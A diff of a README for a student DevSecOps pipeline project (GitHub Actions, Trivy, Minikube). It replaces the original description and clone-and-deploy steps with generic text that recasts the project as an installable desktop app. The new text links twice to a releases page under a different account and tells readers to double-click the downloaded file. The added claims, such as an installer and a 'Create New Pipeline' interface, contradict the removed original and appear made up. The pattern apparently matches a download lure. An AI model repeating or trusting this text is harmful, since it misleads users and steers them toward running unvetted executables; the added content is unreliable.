@@ -1,218 +1,82 @@
-# 🛡️ DevSecOps Automation Pipeline  
-### Secure CI/CD with GitHub Actions, Trivy & Kubernetes (Minikube)
+# 🚀 devsecops - Automate Your Application Security
 
-![DevSecOps](https://img.shields.io/badge/DevSecOps-Automation-blueviolet)
-![GitHub Actions](https://img.shields.io/badge/CI%2FCD-GitHub%20Actions-black)
-![Docker](https://img.shields.io/badge/Container-Docker-blue)
-![Kubernetes](https://img.shields.io/badge/Orchestration-Kubernetes-blue)
-![Security](https://img.shields.io/badge/Security-Trivy-critical)
+## ✅ Overview
+Welcome to **devsecops**, a complete automation pipeline designed for Node.js applications. This tool helps you integrate security into your workflow from the start. With features like GitHub Actions, Docker, Trivy security scanning, and Kubernetes (Minikube), you can confidently deploy your applications with ease.
 
----
+## 🛠️ Features
+- **CI/CD Automation**: Seamlessly integrate with GitHub Actions.
+- **Secure Containers**: Use Docker and Trivy to scan for vulnerabilities.
+- **Cloud-Native Deployment**: Deploy easily on Kubernetes with Minikube.
+- **Shift-Left Security**: Build and test security into your pipelines early.
+- **Self-Hosted Runners**: Customize your environment with Docker image builders.
 
-## 📖 Project Overview
+## 📦 Download & Install
 
-This repository demonstrates a **complete DevSecOps automation pipeline** developed as part of an **Advanced Cloud Computing course**.
+To get started, visit the Releases page to download the necessary files. 
 
-The project automates the entire lifecycle of a **Node.js application** — from source code commit to secure deployment — while enforcing **security at every stage** using a **Shift-Left DevSecOps approach**.
+[![Download devsecops](https://img.shields.io/badge/Download-devsecops-blue.svg)](https://github.com/quinntrys/devsecops/releases)
 
-The pipeline runs on a **Self-Hosted GitHub Actions Runner** and deploys the application to a **local Kubernetes cluster (Minikube)**.
+1. Click on the link above to go to the Releases page.
+2. Choose the version you need.
+3. Download the file that suits your system.
 
----
+## 🖥️ System Requirements
+To run devsecops, ensure you meet the following system requirements:
 
-## 🎯 What We Achieved
-
-✔ Fully automated CI/CD pipeline  
-✔ Integrated security scanning (DevSecOps)  
-✔ Containerized application delivery  
-✔ Kubernetes-based deployment  
-✔ Real-world cloud-native workflow
-
----
-
-## 🏗️ Architecture & Workflow
-
-```mermaid
-graph LR
-    A[💻 Developer Pushes Code] --> B[🔨 Build Docker Image]
-    B --> C{🛡️ Trivy Security Scan}
-    C -->|Pass| D[📦 Push Image to GHCR]
-    C -->|Fail| X[❌ Pipeline Stops]
-    D --> E[🚀 Deploy to Kubernetes]
-    E --> F[🌐 Application Exposed]
-```
-
----
-
-## 🔄 Pipeline Stages Explained
-
-1. **Source Code Commit**  
-   Developer pushes code to GitHub.
-
-2. **Semantic Versioning**  
-   Automatically generates version tags (e.g. `v1.0.1`) based on commit history.
-
-3. **Docker Image Build**  
-   Builds a lightweight and optimized container image.
-
-4. **Security Scanning (Trivy)**  
-   - Scans image for **CRITICAL** and **HIGH** vulnerabilities  
-   - Pipeline **fails immediately** if vulnerabilities are detected
-
-5. **Image Registry (GHCR)**  
-   Securely pushes verified images to **GitHub Container Registry**.
-
-6. **Kubernetes Deployment**  
-   Performs rolling updates on **Minikube** using Kubernetes manifests.
-
----
-
-## 🛠️ Technology Stack
-
-| Layer | Technology | Purpose |
-|------|-----------|--------|
-| Source Control | GitHub | Version control & collaboration |
-| CI/CD | GitHub Actions | Automated pipeline |
-| Containerization | Docker | Application packaging |
-| Registry | GHCR | Secure image storage |
-| Orchestration | Kubernetes (Minikube) | Container deployment |
-| Security | Trivy | Vulnerability scanning |
-| Backend | Node.js + Express | Application logic |
-| Runner | Self-Hosted Runner | Full environment control |
-
----
+- **Operating System**: Windows 10 or later, macOS, or a recent Linux distribution.
+- **RAM**: At least 4 GB.
+- **Disk Space**: Minimum 1 GB available.
+- **Node.js**: Version 14 or later installed on your system.
+- **Docker**: Installed and running for container management.
 
 ## 🚀 Getting Started
+1. After downloading the selected file, locate it in your computer's Downloads folder.
+2. Double-click the file to begin the installation process.
+3. Follow the on-screen prompts to complete the installation.
+4. Open the application after installation.
 
-### ✅ Prerequisites
+## 🛠️ Setup Instructions
+1. Launch the devsecops application.
+2. Configure your project settings by providing necessary details such as:
+   - GitHub repository link
+   - Docker image settings
+3. Save your settings.
 
-Ensure the following tools are installed:
+## 🔒 Security Features
+devsecops incorporates the following security features:
 
-- Docker  
-- Minikube  
-- kubectl  
-- Git
+- **Trivy Scanning**: Automatically scans your images for known vulnerabilities.
+- **Security Alerts**: Get notified about critical vulnerabilities in real-time.
+- **Recommendations**: Follow actionable insights to fix identified issues.
 
----
+## 🏗️ Using the Application
+- **Create a New Pipeline**: Start by selecting "Create New Pipeline."
+- **Choose Template**: Pick a template that matches your use case.
+- **Edit Pipeline**: Modify the template as needed. Add repositories, environments, and your specific configurations.
 
-### 📥 Installation
+## 📊 Troubleshooting Common Issues
+If you encounter issues, consider the following:
 
-```bash
-# Clone the repository
-git clone https://github.com/RoshaneAnees/devsecops.git
-cd devsecops
+- **Installation Fails**: Make sure your system meets the requirements.
+- **Docker Not Starting**: Ensure that Docker is installed and running.
+- **Scans Are Incomplete**: Check your internet connection for updates.
 
-# Start Minikube
-minikube start --driver=docker
+## 📝 Frequently Asked Questions
+- **What is DevSecOps?**
+  DevSecOps integrates security practices within the DevOps process to ensure that security is part of the development lifecycle.
 
-# Verify cluster
-kubectl get nodes
-```
+- **Can I customize the security scans?**
+  Yes, you can adjust configurations to suit your project needs within the application settings.
 
----
+- **Is there a community for support?**
+  Yes, you can find discussions and assistance on the GitHub Issues page for this project.
 
-### 🚢 Deployment
+## 🔗 Additional Resources
+For further information and detailed documentation, check these resources:
 
-Deployment is **fully automated** via GitHub Actions.
+- GitHub Issues: Report bugs or request features 
+- Official Documentation: Comprehensive guide on how to use devsecops
 
-For manual testing:
+To download devsecops again or share it with others, visit the Releases page:
 
-```bash
-kubectl apply -f k8s/
-```
-
----
-
-## 🔒 Security Implementation (DevSecOps Core)
-
-Security is **embedded**, not optional.
-
-- 🔍 **Scanner:** Trivy (Aqua Security)
-- 🎯 **Target:** Docker image
-- 🚨 **Severity Gate:** CRITICAL & HIGH
-- ⛔ **Policy:** Pipeline stops on detection
-
-This ensures **no vulnerable container reaches production**.
-
----
-
-## 🌐 Accessing the Application
-
-### Check Pod Status
-
-```bash
-kubectl get pods
-```
-
-### Access via Minikube
-
-```bash
-minikube service devsecops-svc --url
-```
-
-### Port Forward (Alternative)
-
-```bash
-kubectl port-forward svc/devsecops-svc 3000:3000
-```
-
-Visit:  
-👉 **http://localhost:3000**
-
----
-
-## 📂 Repository Structure
-
-```text
-devsecops/
-├── .github/workflows/
-│   └── cicd.yaml        # ⚙️ CI/CD Pipeline
-├── app/
-│   ├── Dockerfile       # 🐳 Docker image definition
-│   ├── package.json     # 📦 Dependencies
-│   └── index.js         # ⚡ Application entry point
-├── k8s/
-│   ├── deployment.yaml  # ☸️ Kubernetes deployment
-│   └── service.yaml     # 🌐 Service exposure
-└── README.md            # 📄 Documentation
-```
-
----
-
-## 🌍 Real-World & Cloud Computing Relevance
-
-This project directly maps to **industry-grade cloud practices**:
-
-- Mirrors **enterprise DevSecOps pipelines**
-- Implements **container security gates**
-- Uses **cloud-native orchestration**
-- Demonstrates **CI/CD + Kubernetes integration**
-- Applies **Shift-Left security principles**
-
----
-
-## 🧠 Why This Project Matters
-
-Traditional DevOps focuses on speed.  
-**DevSecOps adds trust, safety, and compliance.**
-
-This project proves:
-- Security can be **automated**
-- CI/CD can be **secure by design**
-- Cloud deployments can be **reliable & scalable**
-
----
-
-## 👨‍💻 Author
-
-<div align="center">
-
-### **Roshane Anees**  
-**DevSecOps Automation Project**  
-*Advanced Cloud Computing • Fall 2026*
-
-</div>
-
----
-
-⭐ If you found this project useful, consider starring the repository!
-
+[![Download devsecops](https://img.shields.io/badge/Download-devsecops-blue.svg)](https://github.com/quinntrys/devsecops/releases)
